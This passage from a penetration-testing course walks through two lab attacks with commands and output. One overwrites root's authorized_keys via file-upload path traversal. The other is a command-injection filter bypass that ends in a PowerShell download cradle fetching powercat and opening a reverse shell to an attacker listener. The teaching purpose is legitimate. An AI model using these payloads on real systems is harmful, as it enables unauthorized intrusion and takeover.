### Applications

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running the application as `root` or `Administrator` to avoid any permissions issues. This practice means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Let's try to overwrite the `authorized_keys` file in the home directory for `root`. If this file contains the public key of a private key we control, we can access the system via SSH as the `root` user. To do this, we’ll create an SSH keypair with `ssh-keygen`, as well as a file named `authorized_keys` containing the previously created public key.

```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
kali@kali:~$ cat fileup.pub > authorized_keys
```

**Listing 164 - Prepare `authorized_keys` file for File Upload**

Now that the `authorized_keys` file contains our public key, we can upload it using the relative path `../../../../../../../root/.ssh/authorized_keys`. We will select our `authorized_keys` file in the file upload form and enable intercept in Burp before we click on the Upload button. When Burp shows the intercepted request, we can modify the filename accordingly and press Forward.

**References:**
- [Microsoft Documentation, 2022](https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [Microsoft Documentation, 2022](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools)
- [Wikipedia, 2021](https://en.wikipedia.org/wiki/Ssh-keygen)

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 277**
Made in Morocco
Penetration Testing with Kali Linux

**Figure 142: Exploit File Upload to write `authorized_keys` file in root home directory**

If we’ve successfully overwritten the `authorized_keys` file of the `root` user, we should be able to use our private key to connect to the system via SSH. Note that the `root` user often does not have SSH access permissions. However, since we can’t check for other users by, for example, displaying the contents of `/etc/passwd`, this is our only option.

The target system runs an SSH server on port 2222. Let’s use the corresponding private key of the public key in the `authorized_keys` file to try to connect to the system. We’ll use the `-i` parameter to specify our private key and `-p` for the port.

In the Directory Traversal Learning Unit, we connected to port 2222 on the host `mountaindesserts.com` and our Kali system saved the host key of the remote host. Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously. To avoid this error, we’ll delete the `known_hosts` file before we connect to the system. This file contains all host keys of previous SSH connections.

```bash
kali@kali:~$ rm ~/.ssh/known_hosts
kali@kali:~$ ssh -p 2222 -i fileup PI:EMAIL
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

**Listing 165 - Using the SSH key to successfully connect via SSH as the root user**

We could successfully connect as `root` with our private key due to the overwritten `authorized_keys` file. In scenarios where we can’t use a file upload mechanism to upload executable files, we need to get creative to find other vectors we can leverage.

### 9.4 Command Injection

This Learning Unit covers the following Learning Objectives:
- Learn about command injection in web applications
- Use operating system commands for OS command injection
- Understand how to leverage command injection to gain system access

In this Learning Unit, we will explore how to identify and exploit command injection vulnerabilities. We will learn about OS command injection, which allows us to inject commands into the command line of the underlying operating system of a web application.

#### 9.4.1 OS Command Injection

Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system. Prepared commands provide a set of functions to the underlying system that cannot be changed by user input. However, these APIs and functions are often very time-consuming to plan and develop.

Sometimes a web application needs to address a multitude of different cases, and a set of predefined functions can be too inflexible. In these cases, web developers often tend to directly accept user input, then sanitize it. This means that user input is filtered for any command sequences that might try to change the application’s behavior for malicious purposes.

For this demonstration, let’s review the “Mountain Vaults” web application, running on port 8000 on the MOUNTAIN system. We can open it in our browser by navigating to `http://192.168.50.189:8000`.

**Figure 143: Modified Web Content and new Input Textbox**

Figure 143 shows an updated version of the application. In this version, we’re able to clone git repositories by entering the `git clone` command combined with a URL. The example shows us the same command we would use in the command line. We can hypothesize that maybe the operating system will execute this string and, therefore, we may be able to inject our own commands. Let’s try to use the form to clone the ExploitDB repository.

**Figure 144: Clone command for the ExploitDB repository**

After we click on submit, the cloning process of the ExploitDB repository starts.

**Figure 145: Successfully cloned the ExploitDB Repository via the Web Application**

The output shows that the repository was successfully cloned. Cloning the repository will result in an error within the lab environment. However, to follow along the walkthrough, we can just skip this step.

Furthermore, the actual command is displayed in the web application’s output. Let’s try to inject arbitrary commands such as `ipconfig`, `ifconfig`, and `hostname` with `curl`. We’ll switch over to HTTP history in Burp to understand the correct structure for the POST request. The request indicates the “Archive” parameter is used for the command.

**Figure 146: Archive Parameter in the POST request**

The figure shows that the “Archive” parameter contains the Git command. This means we can use `curl` to provide our own commands to the parameter. We’ll do this by using the `-X` parameter to change the request type to POST. We’ll also use `--data` to specify what data is sent in the POST request.

```bash
kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```

**Listing 166 - Detected Command Injection for `ipconfig`**

On our first try, the web application shows that it detected a command injection attempt with the `ipconfig` command. Let’s attempt to backtrack from the working input and find a bypass for the filter. Next, we’ll try to only provide the `git` command for the Archive parameter in the POST request.

```bash
kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
An error occurred with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
[--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
[-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
...
push Update remote refs along with associated objects
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```

**Listing 167 - Entering `git` as command**

The output shows the help page for the `git` command, confirming that we are not restricted to only using `git clone`. Since we know that only providing `git` works for execution, we can try to add the `version` subcommand. If this is executed, we’ll establish that we can specify any `git` command and achieve code execution. This will also reveal if the web application is running on Windows or Linux, since the output of `git version` includes the “Windows” string in Git for Windows. If the web application is running on Linux, it will only show the version for Git.

```bash
kali@kali:~$ curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
Repository successfully cloned with command: git version and output: git version 2.35.1.windows.2
```

**Listing 167 - Using `git version` to detect the operating system**

The output shows that the web application is running on Windows. Now we can use trial-and-error to poke around the filter and review what’s allowed. Since we established that we cannot simply specify another command, let’s try to combine the `git` and `ipconfig` commands with a URL-encoded semicolon represented as `%3B`. Semicolons can be used in a majority of command lines, such as PowerShell or Bash, as a delimiter for multiple commands. Alternatively, we can use two ampersands, `&&`, to specify two consecutive commands. For the Windows command line (CMD), we can also use one ampersand.

```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
Windows IP Configuration
Ethernet adapter Ethernet0 2:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 192.168.50.189
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
```

**Listing 168 - Entering `git` and `ipconfig` with encoded semicolon**

The output shows that both commands were executed. We can assume that there is a filter in place checking if `git` is executed or perhaps contained in the “Archive” parameter. Next, let’s find out more about how our injected commands are executed. We will first determine if our commands are executed by PowerShell or CMD. In a situation like this, we can use a handy snippet, published by PetSerAl, that displays “CMD” or “PowerShell” depending on where it is executed.

```bash
(dir 2>&1 *`|echo CMD);&echo PowerShell
```

**Listing 169 - Code Snippet to check where our code is executed**

We’ll use URL encoding once again to send it.

```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
...
See 'git help git' for an overview of the system.
PowerShell
```

**Listing 170 - Determining where the injected commands are executed**

The output contains “PowerShell”, meaning that our injected commands are executed in a PowerShell environment.

Next, let’s try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Let’s start a new terminal, copy Powercat to the home directory for the `kali` user, and start a Python3 web server in the same directory.

```bash
kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Listing 171 - Serve Powercat via Python3 web server**

Next, we’ll start a third terminal tab to create a Netcat listener on port 4444 to catch the reverse shell.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

**Listing 172 - Starting Netcat listener on port 4444**

With our web server serving `powercat.ps1` and Netcat listener in place, we can now use `curl` in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the `powercat.ps1` script from our web server. The second command uses the Powercat function to create the reverse shell with the following parameters: `-c` to specify where to connect, `-p` for the port, and `-e` for executing a program.

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

**Listing 173 - Command to download PowerCat and execute a reverse shell**

Again, we’ll use URL encoding for the command and send it.

```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

**Listing 174 - Downloading Powercat and creating a reverse shell via Command Injection**

After entering the command, the second terminal should show that we received a GET request for the `powercat.ps1` file.

```bash
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
```

**Listing 175 - Python3 web server shows GET request for `powercat.ps1`**

We’ll also find an incoming reverse shell connection in the third terminal for our active Netcat listener.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\Administrator\Documents\meteor>
```

**Listing 176 - Successful reverse shell connection via Command Injection**

Listing 176 shows that we received a reverse shell. Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.

### 9.5 Wrapping Up

In this Module, we covered a variety of different common web application attacks. First, we explored how to display the contents of files outside of the web root with directory traversal attacks. Next, we used file inclusion to not only display the contents of files but also to execute files by including them within the web application’s running code. We then abused file upload vulnerabilities with executable and non-executable files. Finally, we learned how to leverage command injection to get access to a web application’s underlying system.

Understanding these kinds of attacks will prove extremely helpful in any kind of security assessment. When we exploit them in publicly-accessible web applications over the internet, they may lead us to an initial foothold in the target’s network. Alternatively, when we find vulnerabilities for these attacks in internal web services, they may provide us with lateral movement vectors.

While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, we should always take the time to briefly understand the web technologies being used before we attempt to exploit them. With the skills covered in this Learning Unit, we can identify and exploit a broad variety of web applications.

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 283**
Made in Morocco
Penetration Testing with Kali Linux